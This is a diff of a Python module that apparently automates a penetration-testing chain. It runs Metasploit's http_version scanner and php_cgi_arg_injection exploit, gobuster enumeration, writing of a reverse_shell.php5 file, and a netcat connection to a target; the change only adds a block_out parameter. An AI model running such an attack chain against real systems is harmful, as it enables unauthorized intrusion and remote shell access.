@@ -6,14 +6,17 @@ import re
 Default = False
 
 class Function():
-    def http_version(func_in, Data, args, cmd, block_In):
+    def http_version(func_in, Data, args, cmd, block_In, block_out):
         # - msfconsole
         # - wait for 15s (msfconsole opening)
         # - use auxiliary/scanner/http/http_version
         # - set RHOSTS {IP}
         # - run
         # - (assume get Apache/2.4.6)
-        match = Default # set default first
+        if bool(block_out):
+            match = True
+        else:
+            match = False
 
         configFile=open('meta.rc','w')
         configFile.write('use auxiliary/scanner/http/http_version\n')
@@ -38,11 +41,14 @@ class Function():
         return Data, match
             
 
-    def php_cgi_arg_injection(func_in, Data, args, cmd, block_In):
+    def php_cgi_arg_injection(func_in, Data, args, cmd, block_In, block_out):
         # use exploit/multi/http/php_cgi_arg_injection
         # - set RHOSTS {IP}
         # - run
-        match = Default # set default first
+        if bool(block_out):
+            match = True
+        else:
+            match = False
 
         configFile=open('meta.rc','w')
         configFile.write('use exploit/multi/http/php_cgi_arg_injection\n')
@@ -60,8 +66,12 @@ class Function():
         
         return Data, match
 
-    def metasploit(func_in, Data, args, cmd, block_In):
-        match = Default # set default first
+    def metasploit(func_in, Data, args, cmd, block_In, block_out):
+        if bool(block_out):
+            match = True
+        else:
+            match = False
+
         script_name = ""
         for arg in args:
             if ".rc" in arg:
@@ -102,13 +112,19 @@ class Function():
 
         return Data, match 
         
-    def print_something(func_in, Data, args, cmd, block_In):
-        match = Default
+    def print_something(func_in, Data, args, cmd, block_In, block_out):
+        if bool(block_out):
+            match = True
+        else:
+            match = False
         print("class chain is running~~")
         return Data, match
 
-    def gobuster(func_in, Data, args, cmd, block_In):
-        match = Default
+    def gobuster(func_in, Data, args, cmd, block_In, block_out):
+        if bool(block_out):
+            match = True
+        else:
+            match = False
         proc = Popen(['gobuster', 'dir', '-u', func_in['IP'], '-w', '/usr/share/wordlists/dirb/common.txt'], stdout=PIPE)
         for stdout_line in iter(proc.stdout.readline, b''):
             # code below just for getting apache version
@@ -120,9 +136,11 @@ class Function():
         # os.system(f"gobuster dir -u {func_in['IP']} -w /usr/share/wordlists/dirb/common.txt")
         return Data, match
 
-    def create_file(func_in, Data, args, cmd, block_In):
-
-        match = Default        
+    def create_file(func_in, Data, args, cmd, block_In, block_out):
+        if bool(block_out):
+            match = True
+        else:
+            match = False
         try:
             with open('/home/kali/Desktop/reverse_shell.php5', 'w') as f:
                 file = args[0]
@@ -135,16 +153,26 @@ class Function():
         
         return Data, match
 
-    def netcat(func_in, Data, args, cmd, block_In):
-        match = Default
+    def netcat(func_in, Data, args, cmd, block_In, block_out):
+        if bool(block_out):
+            match = True
+        else:
+            match = False
         os.system(f"nc {Data['argument']} {func_in['port']}")
         return Data, match
 
-    def get_root(func_in, Data, args, cmd, block_In):
-        match = Default
+    def get_root(func_in, Data, args, cmd, block_In, block_out):
+        if bool(block_out):
+            match = True
+        else:
+            match = False
         return Data, match
 
-    def magic_function(func_in, Data, args, cmd, block_In):
+    def magic_function(func_in, Data, args, cmd, block_In, block_out):
+        if bool(block_out):
+            match = True
+        else:
+            match = False
         for input_token in func_in:
             if ("<" + input_token + ">") in cmd:
                 new_cmd =  cmd.replace("<" + input_token + ">", Data[input_token])
@@ -154,5 +182,4 @@ class Function():
             print("{}".format(stdout_line.decode('utf-8')).rstrip()) 
             if "Unreachable" in stdout_line.decode('utf-8'):
                 proc.kill()
-        match = Default
         return Data, match
